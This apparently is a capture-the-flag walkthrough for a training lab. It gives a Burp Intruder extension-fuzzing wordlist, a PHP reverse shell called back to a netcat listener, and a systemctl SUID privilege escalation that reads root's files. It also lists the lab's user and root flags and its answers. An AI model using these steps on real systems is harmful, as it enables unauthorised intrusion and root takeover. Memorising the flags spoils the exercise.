Task 4: Compromise the webserver [File Upload Extension Bypass]

The upload page blocks standard .php files. We can use Burp Suite Intruder to fuzz extension types.

Step-by-Step Fuzzing with Burp Suite:

  1. Create a wordlist file named phpext.txt containing: 
    .php
.php3
.php4
.php5
.phtml
  2. Intercept a file upload request using Burp Suite and send it to Intruder.
  3. Position the payload marker on the file extension: filename="shell§.php§".
  4. Load phpext.txt as the payload list and uncheck payload encoding.
  5. Start the attack! Notice that .phtml returns a different response length and status code, confirming it is permitted!

Exploitation (Gaining Shell):

1. Download the PentestMonkey PHP Reverse Shell script and edit the configuration settings:

$ip = '10.11.x.x';  // Your THM tun0 IP
$port = 1234;       // Listening port

2. Rename the payload file to revshell.phtml and upload it via http://10.10.161.189:31337/internal/.

3. Set up a Netcat listener on your machine:

nc -lvnp 1234

4. Execute the payload by visiting http://10.10.161.189:31337/internal/uploads/revshell.phtml.

User Flag (cat /home/bill/user.txt): 8837015091ab16b3228d3080d08d69cd

Questions & Answers:

  • What extension is allowed for upload? -> .phtml
  • What is the name of the user who manages the webserver? -> bill
  • What is the user flag? -> 8837015091ab16b3228d3080d08d69cd
Task 5: Privilege Escalation [SUID Binary Abuse]

Now that we have initial access as www-data, search the filesystem for SUID binaries owned by root:

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

Notable SUID Binaries Found:

/bin/su
/bin/ping
/bin/mount
/bin/systemctl  <-- Unusual SUID binary!

Privilege Escalation via systemctl:

Since systemctl has SUID privileges, we can create a custom systemd service file to execute commands as root.

1. Create a variable containing a malicious unit service file payload:

privesc=$(mktemp .service)
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt"
[Install]
WantedBy=multi-user.target' > $privesc

2. Run the unit file using systemctl:

/bin/systemctl link $privesc
/bin/systemctl start $privesc

3. Read the extracted flag file:

cat /tmp/rootflag.txt
Root Flag: a58421703e83b27b3e0202e77e2311f9

Questions & Answers:

  • On the system, search for all SUID files. Which file stands out? -> /bin/systemctl
  • What is the root flag? -> a58421703e83b27b3e0202e77e2311f9
